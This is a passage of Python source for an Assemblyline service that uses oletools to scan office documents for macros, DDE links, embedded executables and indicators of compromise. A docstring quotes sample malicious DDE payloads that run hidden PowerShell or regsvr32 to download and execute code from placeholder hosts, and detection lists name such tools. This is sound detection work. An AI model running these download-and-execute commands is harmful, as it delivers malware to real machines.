"""
Oletools

Assemblyline service using the oletools library to analyze OLE and OOXML files.
"""

from __future__ import annotations

import binascii
import email
import gzip
import hashlib
import json
import logging
import os
import re
import struct
import traceback
import zipfile
import zlib

from collections import defaultdict
from itertools import chain
from typing import Dict, IO, List, Mapping, Optional, Set, Tuple, Union
from urllib.parse import urlparse

import magic
from lxml import etree

import olefile
from oletools.rtfobj import RtfObjParser
from oletools import mraptor, msodde, oleobj
from oletools.common import clsid
from oletools.oleobj import OleNativeStream, OOXML_RELATIONSHIP_TAG
from oletools.oleid import OleID
from oletools.olevba import VBA_Parser, VBA_Scanner
from oletools.thirdparty.xxxswf import xxxswf

from assemblyline.common.iprange import is_ip_reserved
from assemblyline.common.str_utils import safe_str
from assemblyline_v4_service.common.balbuzard.patterns import PatternMatch
from assemblyline_v4_service.common.base import ServiceBase
from assemblyline_v4_service.common.extractor.base64 import find_base64
from assemblyline_v4_service.common.extractor.pe_file import find_pe_files
from assemblyline_v4_service.common.request import ServiceRequest
from assemblyline_v4_service.common.result import Result, ResultSection, BODY_FORMAT, Heuristic
from assemblyline_v4_service.common.task import MaxExtractedExceeded

from oletools_.cleaver import OLEDeepParser
from oletools_.stream_parser import PowerPointDoc


def _add_section(result: Result, result_section: Optional[ResultSection]) -> None:
    """Helper to add optional ResultSections to Results."""
    # If python 3.7 support is dropped this can be replaced
    # by using := to get a one-liner instead
    if result_section:
        result.add_section(result_section)


def _add_subsection(result_section: ResultSection, subsection: Optional[ResultSection]) -> None:
    """Helper to add optional ResultSections to ResultSections."""
    if subsection:
        result_section.add_subsection(subsection)


class Oletools(ServiceBase):
    # OLEtools minimum version supported
    SUPPORTED_VERSION = "0.54.2"

    MAX_STRINGDUMP_CHARS = 500
    MAX_BASE64_CHARS = 8_000_000
    MAX_XML_SCAN_CHARS = 500_000
    MIN_MACRO_SECTION_SCORE = 50
    LARGE_MALFORMED_BYTES = 5000

    METADATA_TO_TAG = {
        'title': 'file.ole.summary.title',
        'subject': 'file.ole.summary.subject',
        'author': 'file.ole.summary.author',
        'comments': 'file.ole.summary.comment',
        'last_saved_by': 'file.ole.summary.last_saved_by',
        'last_printed': 'file.ole.summary.last_printed',
        'create_time': 'file.ole.summary.create_time',
        'last_saved_time': 'file.ole.summary.last_saved_time',
        'manager': 'file.ole.summary.manager',
        'company': 'file.ole.summary.company',
        'codepage': 'file.ole.summary.codepage',
    }

    # In addition to those from olevba.py
    ADDITIONAL_SUSPICIOUS_KEYWORDS = ('WinHttp', 'WinHttpRequest', 'WinInet', 'Lib "kernel32" Alias')

    # Suspicious keywords for dde links
    DDE_SUS_KEYWORDS = ('powershell.exe', 'cmd.exe', 'webclient', 'downloadstring', 'mshta.exe', 'scrobj.dll',
                        'bitstransfer', 'cscript.exe', 'wscript.exe')
    # Extensions of interesting files
    FILES_OF_INTEREST = [b'.APK', b'.APP', b'.BAT', b'.BIN', b'.CLASS', b'.CMD', b'.DAT', b'.DLL', b'.EPS', b'.EXE',
                         b'.JAR', b'.JS', b'.JSE', b'.LNK', b'.MSI', b'.OSX', b'.PAF', b'.PS1', b'.RAR',
                         b'.SCR', b'.SCT', b'.SWF', b'.SYS', b'.TMP', b'.VBE', b'.VBS', b'.WSF', b'.WSH', b'.ZIP']

    # Safelists
    TAG_SAFELIST = [b"management", b"manager", b"microsoft.com"]
    # substrings of URIs to ignore
    URI_SAFELIST = [b"http://purl.org/", b"http://xml.org/", b".openxmlformats.org", b".oasis-open.org",
                    b".xmlsoap.org", b".microsoft.com", b".w3.org", b".gc.ca", b".mil.ca", b"dublincore.org"]
    # substrings at end of IoC to ignore (tuple to be compatible with .endswith())
    PAT_ENDS = (b"themeManager.xml", b"MSO.DLL", b"stdole2.tlb", b"vbaProject.bin", b"VBE6.DLL",
                b"VBE7.DLL")
    # Common blacklist false positives
    BLACKLIST_IGNORE = [b'connect', b'protect', b'background', b'enterprise', b'account', b'waiting', b'request']

    # Bytes Regex's
    DOMAIN_RE = rb'^(?:(?:[a-zA-Z0-9-]+)\.)+[a-zA-Z]{2,5}'
    EXECUTABLE_EXTENSIONS_RE = rb"(?i)\.(EXE|COM|PIF|GADGET|MSI|MSP|MSC|VBS|VBE" \
                               rb"|VB|JSE|JS|WSF|WSC|WSH|WS|BAT|CMD|DLL|SCR" \
                               rb"|HTA|CPL|CLASS|JAR|PS1XML|PS1|PS2XML|PS2|PSC1|PSC2|SCF|SCT|LNK|INF|REG)\b"
    IP_RE = rb'^((?:(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])[.]){3}(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9]))'
    EXTERNAL_LINK_RE = rb'(?s)[Tt]ype="[^"]{1,512}/([^"/]+)"[^>]{1,512}[Tt]arget="((?!file)[^"]+)"[^>]{1,512}' \
                       rb'[Tt]argetMode="External"'
    BASE64_RE = b'([\x20]{0,2}(?:[A-Za-z0-9+/]{10,}={0,2}[\r]?[\n]?){2,})'
    JAVASCRIPT_RE = rb'(?s)script.{1,512}("JScript"|javascript)'
    EXCEL_BIN_RE = rb'(sheet|printerSettings|queryTable|binaryIndex|table)\d{1,12}\.bin'
    VBS_HEX_RE = rb'(?:&H[A-Fa-f0-9]{2}&H[A-Fa-f0-9]{2}){32,}'
    SUSPICIOUS_STRINGS = [
        # In maldoc.yara from decalage2/oledump-contrib/blob/master/
        (rb"(CloseHandle|CreateFile|GetProcAddr|GetSystemDirectory|GetTempPath|GetWindowsDirectory|IsBadReadPtr"
         rb"|IsBadWritePtr|LoadLibrary|ReadFile|SetFilePointer|ShellExecute|URLDownloadToFile|VirtualAlloc|WinExec"
         rb"|WriteFile)", b"use of suspicious system function"),
        # EXE
        (rb'This program cannot be run in DOS mode', b"embedded executable"),
        (rb'(?s)MZ.{32,1024}PE\000\000', b"embedded executable"),
        # Javascript
        (rb'(function\(|\beval[ \t]*\(|new[ \t]+ActiveXObject\(|xfa\.((resolve|create)Node|datasets|form)'
         rb'|\.oneOfChild)', b"embedded javascript")
    ]

    # String Regex's
    CVE_RE = r'CVE-[0-9]{4}-[0-9]*'
    MACRO_WORDS_RE = r'[a-z]{3,}'
    CHR_ADD_RE = r'chr[$]?\((\d+) \+ (\d+)\)'
    CHRW_ADD_RE = r'chrw[$]?\((\d+) \+ (\d+)\)'
    CHR_SUB_RE = r'chr[$]?\((\d+) - (\d+)\)'
    CHRW_SUB_RE = r'chrw[$]?\((\d+) - (\d+)\)'
    CHR_RE = r'chr[$]?\((\d+)\)'
    CHRW_RE = r'chrw[$]?\((\d+)\)'

    def __init__(self, config: Optional[Dict] = None) -> None:
        """Creates an instance of the Oletools service.

        Args:
            config: service configuration (defaults to the configuration in the service manifest).
        """
        super().__init__(config)
        self._oletools_version = ''
        self.request: Optional[ServiceRequest] = None
        self.sha = ''

        self.word_chains: Dict[str, Set[str]] = {}
        self.macro_skip_words: Set[str] = set()

        self.macro_score_max_size: Optional[int] = self.config.get('macro_score_max_file_size', None)
        self.macro_score_min_alert = self.config.get('macro_score_min_alert', 0.6)
        self.metadata_size_to_extract = self.config.get('metadata_size_to_extract', 500)
        self.ioc_pattern_safelist = [string.encode('utf-8', errors='ignore')
                                     for string in self.config.get('ioc_pattern_safelist', [])]
        self.ioc_exact_safelist = [string.encode('utf-8', errors='ignore')
                                   for string in self.config.get('ioc_exact_safelist', [])]
        self.pat_safelist: List[bytes] = self.URI_SAFELIST
        self.tag_safelist: List[bytes] = self.TAG_SAFELIST

        self.patterns = PatternMatch()
        self.macros: List[str] = []
        self.pcode: List[str] = []
        self.extracted_clsids: Set[str] = set()
        self.excess_extracted: int = 0
        self.vba_stomping = False

    def start(self) -> None:
        """Initializes the service."""
        self.log.debug("Service started")

        from oletools.olevba import __version__ as olevba_version
        from oletools.oleid import __version__ as oleid_version
        from oletools.rtfobj import __version__ as rtfobj_version
        from oletools.msodde import __version__ as msodde_version
        self._oletools_version = f"olevba v{olevba_version}, oleid v{oleid_version}, " \
                                 f"rtfobj v{rtfobj_version}, msodde v{msodde_version}"

        chain_path = os.path.join(os.path.dirname(__file__), "chains.json.gz")
        with gzip.open(chain_path) as f:
            self.word_chains = json.load(f)

        for k, v in self.word_chains.items():
            self.word_chains[k] = set(v)

        # Don't reward use of common keywords
        self.macro_skip_words = {'var', 'unescape', 'exec', 'for', 'while', 'array', 'object',
                                 'length', 'len', 'substr', 'substring', 'new', 'unicode', 'name', 'base',
                                 'dim', 'set', 'public', 'end', 'getobject', 'createobject', 'content',
                                 'regexp', 'date', 'false', 'true', 'none', 'break', 'continue', 'ubound',
                                 'none', 'undefined', 'activexobject', 'document', 'attribute', 'shell',
                                 'thisdocument', 'rem', 'string', 'byte', 'integer', 'int', 'function',
                                 'text', 'next', 'private', 'click', 'change', 'createtextfile', 'savetofile',
                                 'responsebody', 'opentextfile', 'resume', 'open', 'environment', 'write', 'close',
                                 'error', 'else', 'number', 'chr', 'sub', 'loop'}

    def get_tool_version(self) -> str:
        """Returns the version of oletools used by the service."""
        return self._oletools_version

    def execute(self, request: ServiceRequest) -> None:
        """Main Module. See README for details."""
        request.result = Result()
        self.request = request
        self.sha = request.sha256
        self.extracted_clsids = set()

        self.macros = []
        self.pcode = []
        self.excess_extracted = 0
        self.vba_stomping = False

        if request.deep_scan:
            self.pat_safelist = self.URI_SAFELIST
            self.tag_safelist = self.TAG_SAFELIST
        else:
            self.pat_safelist = self.URI_SAFELIST + self.ioc_pattern_safelist
            self.tag_safelist = self.TAG_SAFELIST + self.ioc_exact_safelist

        file_contents = request.file_contents
        path = request.file_path
        result = request.result

        try:
            _add_section(result, self._check_for_indicators(path))
            _add_section(result, self._check_for_dde_links(path))
            if request.task.file_type == 'document/office/mhtml':
                _add_section(result, self._rip_mhtml(file_contents))
            self._extract_streams(path, result, request.deep_scan)
            _add_section(result, self._extract_rtf(file_contents))
            _add_section(result, self._check_for_macros(path, request.sha256))
            _add_section(result, self._create_macro_sections(request.sha256))
            self._check_xml_strings(path, result, request.deep_scan)
        except Exception:
            self.log.error(
                f"We have encountered a critical error for sample {self.sha}: {traceback.format_exc(limit=2)}")

        if request.deep_scan:
            # Proceed with OLE Deep extraction
            parser = OLEDeepParser(path, result, self.log, request.task)
            # noinspection PyBroadException
            try:
                parser.run()
            except Exception as e:
                self.log.error(f"Error while deep parsing {path}: {str(e)}")
                section = ResultSection(f"Error deep parsing: {str(e)}")
                result.add_section(section)

        if self.excess_extracted:
            self.log.error(f"Too many files extracted for sample {self.sha}."
                           f" {self.excess_extracted} files were not extracted")
        request.set_service_context(self.get_tool_version())

    def _check_for_indicators(self, filename: str) -> Optional[ResultSection]:
        """Finds and reports on indicator objects typically present in malicious files.

        Args:
            filename: Path to original OLE sample.

        Returns:
            A result section with the indicators if any were found.
        """
        # noinspection PyBroadException
        try:
            ole_id = OleID(filename)
            indicators = ole_id.check()
            section = ResultSection("OleID indicators", heuristic=Heuristic(34))

            for indicator in indicators:
                # Ignore these OleID indicators, they aren't all that useful.
                if indicator.id in ("ole_format", "has_suminfo",):
                    continue

                # Skip negative results.
                if indicator.risk != 'none':
                    # List info indicators but don't score them.
                    if indicator.risk == 'info':
                        section.add_line(f'{indicator.name}: {indicator.value}'
                                         + (f', {indicator.description}' if indicator.description else ''))
                    else:
                        assert section.heuristic
                        section.heuristic.add_signature_id(indicator.name)
                        section.add_line(f'{indicator.name} ({indicator.value}): {indicator.description}')

            if section.body:
                return section
        except Exception:
            self.log.debug(f"OleID analysis failed for sample {self.sha}")
        return None

    def _check_for_dde_links(self, filepath: str) -> Optional[ResultSection]:
        """Use msodde in OLETools to report on DDE links in document.

        Args:
            filepath: Path to original sample.

        Returns:
            A section with the dde links if any are found.
        """
        # noinspection PyBroadException
        try:
            # TODO -- undetermined if other fields could be misused.. maybe do 2 passes, 1 filtered & 1 not
            links_text = msodde.process_file(filepath=filepath, field_filter_mode=msodde.FIELD_FILTER_DDE)

            # TODO -- Workaround: remove root handler(s) that was added with implicit log_helper.enable_logging() call
            logging.getLogger().handlers = []

            links_text = links_text.strip()
            if links_text:
                return self._process_dde_links(links_text)

        # Unicode and other errors common for msodde when parsing samples, do not log under warning
        except Exception as e:
            self.log.debug(f"msodde parsing for sample {self.sha} failed: {str(e)}")
        return None

    def _process_dde_links(self, links_text: str) -> Optional[ResultSection]:
        """Examine DDE links and report on malicious characteristics.

        Args:
            links_text: DDE link text.
            ole_section: OLE AL result.

        Returns:
            A section with dde links if any are found.
        """
        ddeout_name = f'{self.sha}.ddelinks.original'
        self._extract_file(links_text.encode(), ddeout_name, "Original DDE Links")

        ''' typical results look like this:
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
        \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
        ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx"
        DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden
        $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell
        -Command $e"
        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe"
        "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons"
        '''

        # To date haven't seen a sample with multiple links yet but it should be possible..
        dde_section = ResultSection("MSO DDE Links:", body_format=BODY_FORMAT.MEMORY_DUMP)
        dde_extracted = False
        looksbad = False

        for line in links_text.splitlines():
            if ' ' in line:
                (link_type, link_text) = line.strip().split(' ', 1)

                # do some cleanup here to aid visual inspection
                link_type = link_type.strip()
                link_text = link_text.strip()
                link_text = link_text.replace(u'\\\\', u'\u005c')  # a literal backslash
                link_text = link_text.replace(u'\\"', u'"')
                dde_section.add_line(f"Type: {link_type}")
                dde_section.add_line(f"Text: {link_text}")
                dde_section.add_line("\n\n")
                dde_extracted = True

                data = links_text.encode()
                self._extract_file(data, f'{hashlib.sha256(data).hexdigest()}.ddelinks', "Tweaked DDE Link")

                link_text_lower = link_text.lower()
                if any(x in link_text_lower for x in self.DDE_SUS_KEYWORDS):
                    looksbad = True

                dde_section.add_tag('file.ole.dde_link', link_text)
        if dde_extracted:
            dde_section.set_heuristic(16 if looksbad else 15)
            return dde_section
        return None

    def _rip_mhtml(self, data: bytes) -> Optional[ResultSection]:
        """Parses and extracts ActiveMime Document (document/office/mhtml).

        Args:
            data: MHTML data.

        Returns:
            A result section with the extracted activemime filenames if any are found.
        """
        mime_res = ResultSection("ActiveMime Document(s) in multipart/related", heuristic=Heuristic(26))
        mhtml = email.message_from_bytes(data)
        # find all the attached files:
        for part in mhtml.walk():
            content_type = part.get_content_type()
            if content_type == "application/x-mso":
                part_data = part.get_payload(decode=True)
                if len(part_data) > 0x32 and part_data[:10].lower() == "activemime":
                    try:
                        part_data = zlib.decompress(part_data[0x32:])  # Grab  the zlib-compressed data
                        part_filename = part.get_filename(None) or hashlib.sha256(part_data).hexdigest()
                        self._extract_file(part_data, part_filename, "ActiveMime x-mso from multipart/related.")
                        mime_res.add_line(part_filename)
                    except Exception as e:
                        self.log.debug(f"Could not decompress ActiveMime part for sample {self.sha}: {str(e)}")

        return mime_res if mime_res.body else None

# -- Ole Streams --

    # noinspection PyBroadException
    def _extract_streams(self, file_name: str, result: Result,
                         extract_all: bool = False) -> None:
        """Extracts OLE streams and reports on metadata and suspicious properties.

        Args:
            file_name: Path to original sample.
            result: Top level result for adding stream result sections.
            extract_all: Whether to extract all streams.
        """
        try:
            # Streams in the submitted ole file
            with open(file_name, 'rb') as olef:
                ole_res = self._process_ole_file(self.sha, olef, extract_all)
            if ole_res is not None:
                result.add_section(ole_res)

            if not zipfile.is_zipfile(file_name):
                return  # File is not ODF

            # Streams in ole files embedded in submitted ODF file
            subdoc_res = ResultSection("Embedded OLE files")
            if ole_res is not None:  # File is both OLE and ODF
                subdoc_res.set_heuristic(2)
            with zipfile.ZipFile(file_name) as z:
                for f_name in z.namelist():
                    with z.open(f_name) as f:
                        _add_subsection(subdoc_res, self._process_ole_file(f_name, f, extract_all))

            if subdoc_res.heuristic or subdoc_res.subsections:
                result.add_section(subdoc_res)
        except Exception:
            self.log.warning(f"Error extracting streams for sample {self.sha}: {traceback.format_exc(limit=2)}")

    def _process_ole_file(self, name: str, ole_file: IO[bytes],
                          extract_all: bool = False) -> Optional[ResultSection]:
        """Parses OLE data and reports on metadata and suspicious properties.

        Args:
            name: The ole document name.
            ole_file: The path to the ole file.
            extract_all: Whether to extract all streams.

        Returns:
            A result section if there are results to be reported.
        """
        if not olefile.isOleFile(ole_file):
            return None

        ole = olefile.OleFileIO(ole_file)
        if ole.direntries is None:
            return None

        streams_section = ResultSection(f"OLE Document {name}")
        _add_subsection(streams_section, self._process_ole_metadata(ole.get_metadata()))
        _add_subsection(streams_section, self._process_ole_alternate_metadata(ole_file))
        _add_subsection(streams_section, self._process_ole_clsid(ole))

        decompress = any("\x05HwpSummaryInformation" in dir_entry for dir_entry in ole.listdir())
        decompress_macros: List[bytes] = []

        exstr_sec = None
        if extract_all:
            exstr_sec = ResultSection("Extracted Ole streams:", body_format=BODY_FORMAT.MEMORY_DUMP)
        ole10_res = False
        ole10_sec = ResultSection("Extracted Ole10Native streams:", body_format=BODY_FORMAT.MEMORY_DUMP,
                                  heuristic=Heuristic(29, frequency=0))
        pwrpnt_res = False
        pwrpnt_sec = ResultSection("Extracted Powerpoint streams:", body_format=BODY_FORMAT.MEMORY_DUMP)
        swf_sec = ResultSection("Flash objects detected in OLE stream:", body_format=BODY_FORMAT.MEMORY_DUMP,
                                heuristic=Heuristic(5))
        hex_sec = ResultSection("VB hex notation:", heuristic=Heuristic(6))
        sus_res = False
        sus_sec = ResultSection("Suspicious stream content:", heuristic=Heuristic(9, frequency=0))

        ole_dir_examined = set()
        for direntry in ole.direntries:
            extract_stream = False
            if direntry is None or direntry.entry_type != olefile.STGTY_STREAM:
                continue
            stream = safe_str(direntry.name)
            self.log.debug(f"Extracting stream {stream} for sample {self.sha}")

            # noinspection PyProtectedMember
            fio = ole._open(direntry.isectStart, direntry.size)

            data = fio.getvalue()
            stm_sha = hashlib.sha256(data).hexdigest()
            # Only process unique content
            if stm_sha in ole_dir_examined:
                continue
            ole_dir_examined.add(stm_sha)

            # noinspection PyBroadException
            try:
                if "Ole10Native" in stream and self._process_ole10native(stream, data, ole10_sec):
                    ole10_res = True
                    continue

                if "PowerPoint Document" in stream and self._process_powerpoint_stream(data, pwrpnt_sec):
                    pwrpnt_res = True
                    continue

                if decompress:
                    try:
                        data = zlib.decompress(data, -15)
                    except zlib.error:
                        pass

                # Find flash objects in streams
                if b'FWS' in data or b'CWS' in data:
                    if self._extract_swf_objects(fio):
                        swf_sec.add_line(f"Flash object detected in OLE stream {stream}")

                # Find hex encoded chunks
                for vbshex in re.findall(self.VBS_HEX_RE, data):
                    if self._extract_vb_hex(vbshex):
                        hex_sec.add_line(f"Found large chunk of VBA hex notation in stream {stream}")

                # Find suspicious strings
                # Look for suspicious strings
                for pattern, desc in self.SUSPICIOUS_STRINGS:
                    matched = re.search(pattern, data, re.M)
                    if matched and "_VBA_PROJECT" not in stream:
                        extract_stream = True
                        sus_res = True
                        body = f"'{safe_str(matched.group(0))}' string found in stream " \
                               f"{stream}, indicating {safe_str(desc)}"
                        if b'javascript' in desc:
                            sus_sec.add_subsection(ResultSection("Suspicious string found: 'javascript'",
                                                                 body=body,
                                                                 heuristic=Heuristic(23)))
                        elif b'executable' in desc:
                            sus_sec.add_subsection(ResultSection("Suspicious string found: 'executable'",
                                                                 body=body,
                                                                 heuristic=Heuristic(24)))
                        else:
                            sus_sec.add_subsection(ResultSection("Suspicious string found",
                                                                 body=body,
                                                                 heuristic=Heuristic(25)))

                # Finally look for other IOC patterns, will ignore SRP streams for now
                if not re.match(r'__SRP_[0-9]*', stream):
                    iocs, extract_stream = self._check_for_patterns(data, extract_all)
                    if iocs:
                        sus_sec.add_line(f"IOCs in {stream}:")
                        sus_res = True
                    for tag_type, tags in iocs.items():
                        sus_sec.add_line(
                            f"    Found the following {tag_type.rsplit('.', 1)[-1].upper()} string(s):")
                        sus_sec.add_line('    ' + safe_str(b'  |  '.join(tags)))
                        for tag in tags:
                            sus_sec.add_tag(tag_type, tag)
                ole_b64_res = self._check_for_b64(data, stream)
                if ole_b64_res:
                    ole_b64_res.set_heuristic(10)
                    extract_stream = True
                    sus_res = True
                    sus_sec.add_subsection(ole_b64_res)

                # All streams are extracted with deep scan
                if extract_stream or swf_sec.body or hex_sec.body or extract_all:
                    if exstr_sec:
                        exstr_sec.add_line(f"Stream Name:{stream}, SHA256: {stm_sha}")
                    self._extract_file(data, f'{stm_sha}.ole_stream', f"Embedded OLE Stream {stream}")
                    if decompress and (stream.endswith(".ps") or stream.startswith("Scripts/") or
                                       stream.endswith(".eps")):
                        decompress_macros.append(data)

            except Exception:
                self.log.warning(f"Error adding extracted stream {stream} for sample "
                                 f"{self.sha}:\t{traceback.format_exc()}")

        if exstr_sec and exstr_sec.body:
            streams_section.add_subsection(exstr_sec)
        if ole10_res:
            streams_section.add_subsection(ole10_sec)
        if pwrpnt_res:
            streams_section.add_subsection(pwrpnt_sec)
        if swf_sec.body:
            streams_section.add_subsection(swf_sec)
        if hex_sec.body:
            streams_section.add_subsection(hex_sec)
        if sus_res:
            assert sus_sec.heuristic
            sus_sec.heuristic.increment_frequency(sum(len(tags) for tags in sus_sec.tags.values()))
            streams_section.add_subsection(sus_sec)

        if decompress_macros:
            # HWP Files
            ResultSection("Compressed macros found, see extracted files", heuristic=Heuristic(22),
                          parent=streams_section)
            macros = b'\n'.join(decompress_macros)
            stream_name = f'{hashlib.sha256(macros).hexdigest()}.macros'
            self._extract_file(macros, stream_name, "Combined macros")

        return streams_section

    def _process_ole_metadata(self, meta: olefile.OleMetadata) -> Optional[ResultSection]:
        """Create sections for ole metadata.

        Args:
            meta: the ole metadata.

        Returns:
            A result section with metadata info if any metadata was found.
        """
        meta_sec = ResultSection("OLE Metadata:")
        meta_sec_json_body = dict()
        codec = safe_str(getattr(meta, 'codepage', 'latin_1'), force_str=True)
        for prop in chain(meta.SUMMARY_ATTRIBS, meta.DOCSUM_ATTRIBS):
            value = getattr(meta, prop)
            if value is not None and value not in ['"', "'", ""]:
                if prop == "thumbnail":
                    meta_name = f'{hashlib.sha256(value).hexdigest()[0:15]}.{prop}.data'
                    self._extract_file(value, meta_name, "OLE metadata thumbnail extracted")
                    meta_sec_json_body[prop] = "[see extracted files]"
                    # Todo: is thumbnail useful as a heuristic?
                    # Doesn't score and causes error how its currently set.
                    # meta_sec.set_heuristic(18)
                    continue
                # Extract data over n bytes
                if isinstance(value, str) and len(value) > self.metadata_size_to_extract:
                    data = value.encode()
                    meta_name = f'{hashlib.sha256(data).hexdigest()[0:15]}.{prop}.data'
                    self._extract_file(data, meta_name, f"OLE metadata from {prop.upper()} attribute")
                    meta_sec_json_body[prop] = f"[Over {self.metadata_size_to_extract} bytes, see extracted files]"
                    meta_sec.set_heuristic(17)
                    continue
                if isinstance(value, bytes):
                    try:
                        value = value.decode(codec)
                    except ValueError:
                        self.log.warning('Failed to decode %r with %s' % value, codec)
                meta_sec_json_body[prop] = safe_str(value, force_str=True)
                # Add Tags
                if prop in self.METADATA_TO_TAG and value:
                    meta_sec.add_tag(self.METADATA_TO_TAG[prop], safe_str(value))
        if meta_sec_json_body:
            meta_sec.set_body(json.dumps(meta_sec_json_body), BODY_FORMAT.KEY_VALUE)
            return meta_sec
        return None

    def _process_ole_alternate_metadata(self, ole_file: IO[bytes]) -> Optional[ResultSection]:
        """Extract alternate OLE document metadata SttbfAssoc strings
        https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-doc/f6f1030e-2e5e-46ff-92f0-b228c5585308

        Args:
            ole_file: OLE bytesIO to process

        Returns:
            A result section with alternate metadata info if any metadata was found.
        """
        json_body = {}

        sttb_fassoc_start_bytes = b'\xFF\xFF\x12\x00\x00\x00'
        sttb_fassoc_lut = {
            0x01: 'template',
            0x02: 'title',
            0x03: 'subject',
            0x04: 'keywords',
            0x06: 'author',
            0x07: 'last_saved_by',
            0x08: 'mail_merge_data_source',
            0x09: 'mail_merge_header_document',
            0x11: 'write_reservation_password',
        }
        _ = ole_file.seek(0)
        data = ole_file.read()
        sttb_fassoc_idx = data.find(sttb_fassoc_start_bytes)
        if sttb_fassoc_idx < 0:
            return
        current_pos = sttb_fassoc_idx + len(sttb_fassoc_start_bytes)

        for i in range(18):
            try:
                str_len, *_ = struct.unpack('H', data[current_pos:current_pos+2])
            except struct.error:
                self.log.warning('Could not get STTB metadata length, is the data truncated?')
                return
            current_pos += 2
            str_len *= 2
            if str_len > 0:
                if i in sttb_fassoc_lut:
                    safe_val = safe_str(data[current_pos:current_pos + str_len].decode('utf16', 'ignore'))
                    json_body[sttb_fassoc_lut[i]] = safe_val
                current_pos += str_len
            else:
                continue

        if json_body:
            link = json_body.get(sttb_fassoc_lut[1], '')
            alternate_section = ResultSection("OLE Alternate Metadata:",
                                 body=json.dumps(json_body),
                                 body_format=BODY_FORMAT.KEY_VALUE)
            if link:
                alternate_section.set_heuristic(self._process_link('attachedtemplate', link, Heuristic(1), alternate_section))
        return None

    def _process_ole_clsid(self, ole: olefile.OleFileIO) -> Optional[ResultSection]:
        """Create section for ole clsids.

        Args:
            ole: The olefile.
        Returns:
            A result section with the clsid of the file if it can be identified.
        """
        clsid_sec_json_body = dict()
        clsid_sec = ResultSection("CLSID:")
        if not ole.root or not ole.root.clsid:
            return None
        ole_clsid = ole.root.clsid
        if ole_clsid is None or ole_clsid in ['"', "'", ""] or ole_clsid in self.extracted_clsids:
            return None
        self.extracted_clsids.add(ole_clsid)
        clsid_sec.add_tag('file.ole.clsid', f"{safe_str(ole_clsid)}")
        clsid_desc = clsid.KNOWN_CLSIDS.get(ole_clsid, 'unknown CLSID')
        if 'CVE' in clsid_desc:
            for cve in re.findall(self.CVE_RE, clsid_desc):
                clsid_sec.add_tag('attribution.exploit', cve)
            if 'Known' in clsid_desc or 'exploit' in clsid_desc:
                clsid_sec.set_heuristic(52)
        clsid_sec_json_body[ole_clsid] = clsid_desc
        clsid_sec.set_body(json.dumps(clsid_sec_json_body), BODY_FORMAT.KEY_VALUE)
        return clsid_sec

    def _process_ole10native(self, stream_name: str, data: bytes, streams_section: ResultSection) -> bool:
        """Parses ole10native data and reports on suspicious content.

        Args:
            stream_name: Name of OLE stream.
            data: Ole10native data.
            streams_section: Ole10Native result section (must have heuristic set).

        Returns:
            If suspicious content is found
        """
        assert streams_section.heuristic

        suspicious = False
        sus_sec = ResultSection("Suspicious streams content:")
        native = OleNativeStream(data)
        if not all(native_item for native_item in [native.data, native.filename, native.src_path, native.temp_path]):
            self.log.warning(f"Failed to parse Ole10Native stream for sample {self.sha}")
            return False
        self._extract_file(native.data,
                           hashlib.sha256(native.data).hexdigest(),
                           f"Embedded OLE Stream {stream_name}")
        stream_desc = f"{stream_name} ({native.filename}):\n\tFilepath: {native.src_path}" \
                      f"\n\tTemp path: {native.temp_path}\n\tData Length: {native.native_data_size}"
        streams_section.add_line(stream_desc)
        # Tag Ole10Native header file labels
        streams_section.add_tag('file.name.extracted', native.filename)
        streams_section.add_tag('file.name.extracted', native.src_path)
        streams_section.add_tag('file.name.extracted', native.temp_path)
        streams_section.heuristic.increment_frequency()
        if find_pe_files(native.data):
            streams_section.heuristic.add_signature_id('embedded_pe_file')
        # handle embedded native macros
        if native.filename.endswith(".vbs") or \
                native.temp_path.endswith(".vbs") or \
                native.src_path.endswith(".vbs"):

            self.macros.append(safe_str(native.data))
        else:
            # Look for suspicious strings
            for pattern, desc in self.SUSPICIOUS_STRINGS:
                matched = re.search(pattern, native.data)
                if matched:
                    suspicious = True
                    if b'javascript' in desc:
                        sus_sec.add_subsection(ResultSection("Suspicious string found: 'javascript'",
                                                             heuristic=Heuristic(23)))
                    if b'executable' in desc:
                        sus_sec.add_subsection(ResultSection("Suspicious string found: 'executable'",
                                                             heuristic=Heuristic(24)))
                    else:
                        sus_sec.add_subsection(ResultSection("Suspicious string found",
                                                             heuristic=Heuristic(25)))
                    sus_sec.add_line(f"'{safe_str(matched.group(0))}' string found in stream "
                                     f"{native.src_path}, indicating {safe_str(desc)}")

        if suspicious:
            streams_section.add_subsection(sus_sec)

        return True

    def _process_powerpoint_stream(self, data: bytes, streams_section: ResultSection) -> bool:
        """Parses powerpoint stream data and reports on suspicious characteristics.

        Args:
            data: Powerpoint stream data.
            streams_section: Streams AL result section.

        Returns:
           If processing was successful
        """
        try:
            powerpoint = PowerPointDoc(data)
            pp_line = "PowerPoint Document"
            if len(powerpoint.objects) > 0:
                streams_section.add_line(pp_line)
            for obj in powerpoint.objects:
                if obj.rec_type == "ExOleObjStg":
                    if obj.error is not None:
                        streams_section.add_line("\tError parsing ExOleObjStg stream. This is suspicious.")
                        if streams_section.heuristic:
                            streams_section.heuristic.increment_frequency()
                        else:
                            streams_section.set_heuristic(28)
                        continue

                    ole_hash = hashlib.sha256(obj.raw).hexdigest()
                    self._extract_file(obj.raw,
                                       f"{ole_hash}.pp_ole",
                                       "Embedded Ole Storage within PowerPoint Document Stream")
                    streams_section.add_line(f"\tPowerPoint Embedded OLE Storage:\n\t\tSHA-256: {ole_hash}\n\t\t"
                                             f"Length: {len(obj.raw)}\n\t\tCompressed: {obj.compressed}")
                    self.log.debug(f"Added OLE stream within a PowerPoint Document Stream: {ole_hash}.pp_ole")
            return True
        except Exception as e:
